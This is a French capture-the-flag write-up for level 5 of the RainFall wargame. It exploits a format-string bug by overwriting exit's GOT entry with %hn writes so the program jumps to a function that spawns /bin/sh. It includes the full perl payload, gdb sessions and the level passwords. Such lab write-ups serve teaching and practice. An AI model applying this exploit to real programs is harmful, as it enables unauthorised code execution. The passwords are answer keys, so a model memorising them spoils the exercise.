# Level 5

pass : `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`

## Sources :

```c=
#include <stdio.h>

// 0x080484a4
void	o() {
	system("/bin/sh");
	_exit(1);
}

// 0x080484c2
void	n() {
	// char *fgets(char *s, int size, FILE *stream);
	char	str[520];  // 0x208
	fgets(str, 512, stdin);  // 0x200
	printf(str);
	exit(1);
}

// 0x08048504
void	main() {
	n();
}
```

## Recherche :

> Ici, on voit que la fonction `o()` à l'adresse `0x080484a4` nous permettrait d'exécuter un shell.
> On va donc exploiter `printf()` pour changer le pointeur de fonction de `exit()` pour le faire pointer plutôt vers `o()`

Comme fait précédement, on va chercher l'offset qu'on trouve à `4`:
```
$ ./script.sh ./level5
Index 0
Index 1
Index 2
Index 3
Index 4
AAAA41414141
```

Inspectons la GOT (**Global Offset Table**) :

```
[0]kali@kali:~/rainfall$ objdump -R ./level5

./level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin@@GLIBC_2.0
08049824 R_386_JUMP_SLOT   printf@GLIBC_2.0
08049828 R_386_JUMP_SLOT   _exit@GLIBC_2.0
0804982c R_386_JUMP_SLOT   fgets@GLIBC_2.0
08049830 R_386_JUMP_SLOT   system@GLIBC_2.0
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit@GLIBC_2.0
0804983c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
```

On va donc écrire à l'adresse `0x08049838` où se trouve la routine `exit`.

```gdb
gdb-peda$ r < <(perl -e 'print "\x38\x98\x04\x08%4\$n"')
Starting program: /home/kali/rainfall/level5 < <(perl -e 'print "\x38\x98\x04\x08%4\$n"')

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x4
EBX: 0x0
ECX: 0x0
EDX: 0x7ffffffb
ESI: 0xb7fb7000 --> 0x1dfd6c
EDI: 0xb7fb7000 --> 0x1dfd6c
EBP: 0xbffff2f8 --> 0xbffff308 --> 0x0
ESP: 0xbffff0dc --> 0x8048504 (<main>:  push   ebp)
EIP: 0x4
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x4
[------------------------------------stack-------------------------------------]
0000| 0xbffff0dc --> 0x8048504 (<main>: push   ebp)
0004| 0xbffff0e0 --> 0x1
0008| 0xbffff0e4 --> 0x200
0012| 0xbffff0e8 --> 0xb7fb7580 --> 0xfbad2098
0016| 0xbffff0ec --> 0xb7fda53c (<dl_main+8636>:        mov    eax,DWORD PTR [ebp-0x14c])
0020| 0xbffff0f0 --> 0x8049838 --> 0x4
0024| 0xbffff0f4 ("%4$n")
0028| 0xbffff0f8 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000004 in ?? ()
```

On a bien mis dans l'`EIP` l'addresse `0x4`, c'est à dire le nombre de bits de `\x38\x98\x04\x08`
Maintenant on va mettre l'addre de `o()` qui est `0x080484a4` avec `%hn`

Donc on veut excrire `0x84a4` puis `0x0804`
- `0x0804` - `8` = `2044`
- `0x84a4` - `0x0804` = `31904`


`
r < <(perl -e 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4\$hn%31904x%5\$hn"')`

```gdb
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp
   0x080484aa <+6>:     movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
(gdb) b *0x080484a7
Breakpoint 1 at 0x80484a7
(gdb) r < <(perl -e 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4\$hn%31904x%5\$hn"')
Starting program: /home/kali/rainfall/level5 < <(perl -e 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4\$hn%31904x%5\$hn"')
:8
.
.
.
Breakpoint 1, 0x080484a7 in o ()
(gdb)
```
On a donc réussi à atteindre `o()`

Il ne reste plus qu'à lancer la commande et récuperer le pass.

## Exploit :

```shell=
level5@RainFall:~$ (perl -e 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4\$hn%31904x%5\$hn"';cat) | ./level5
whoami
level6
cd ../level6
cat .pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

----

## Documentation :
* [Une simple Exploitation de vulnérabilité Format String](https://www.exploit-db.com/papers/23985)
